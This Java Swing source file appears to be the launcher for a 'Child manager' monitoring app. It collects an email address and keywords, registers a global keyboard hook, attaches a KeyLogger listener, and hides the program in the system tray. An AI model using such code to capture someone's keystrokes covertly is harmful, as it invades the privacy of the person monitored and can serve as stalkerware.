package core;

import java.awt.BorderLayout;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.UIManager;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import java.awt.event.WindowEvent;

public class UI {
	String appName = "Child manager";
	JTextField emailField;
	JTextField keywordField;
	JFrame preFrame;
	String email;

	public static JPanel jp = new JPanel(new GridLayout(2, 1));

	public static void main(String[] args) {
		SharedPreferences preferences = new SharedPreferences();
		String savedEmailString = preferences.readEmail();
		String savedKeywordString = preferences.readKeyword();
		SwingUtilities.invokeLater(new Runnable() {
			@Override
			public void run() {
				try {
					UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
				} catch (Exception e) {
					e.printStackTrace();
				}
				UI mainGUI = new UI();
				mainGUI.preDisplay(savedEmailString, savedKeywordString);
			}
		});
	}

	public void preDisplay(String email, String keyword) {
		preFrame = new JFrame(appName);
		emailField = new JTextField(15);
		keywordField = new JTextField(15);
		JLabel serverPanel = new JLabel("Enter keywords:");
		JPanel prePanel = new JPanel();
		GridLayout experimentLayout = new GridLayout(2, 2);
		prePanel.setLayout(experimentLayout);

		preFrame = new JFrame(appName);
		emailField = new JTextField(15);
		JLabel chooseUsernameLabel = new JLabel("Enter email:");
		JButton enterServer = new JButton("Start");
		enterServer.addActionListener(new enterServerButtonListener());

		emailField.setText(email);
		keywordField.setText(keyword);

		prePanel.add(chooseUsernameLabel);
		prePanel.add(emailField);
		prePanel.add(serverPanel);
		prePanel.add(keywordField);
		preFrame.add(prePanel, BorderLayout.CENTER);
		preFrame.add(enterServer, BorderLayout.SOUTH);
		preFrame.setSize(300, 300);
		preFrame.setVisible(true);

	}

	public void start() {
		try {
			/* Register jNativeHook */
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException ex) {
			/* Its error */
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());
			System.exit(1);
		}

		GlobalScreen.addNativeKeyListener(new KeyLogger(this.email, this.keywordField.getText()));
		SharedPreferences preferences = new SharedPreferences();
		preferences.saveEmail(this.email);
		preferences.saveKeyword(this.keywordField.getText());
		BackgroundTray.addTray();
		preFrame.dispatchEvent(new WindowEvent(preFrame, WindowEvent.WINDOW_CLOSING));
	}

	class enterServerButtonListener implements ActionListener {
		public void actionPerformed(ActionEvent event) {
			email = emailField.getText();
			if (email.length() < 1) {
				System.out.println("No!");
			} else {
				preFrame.setVisible(false);
				start();
			}
		}

	}
}
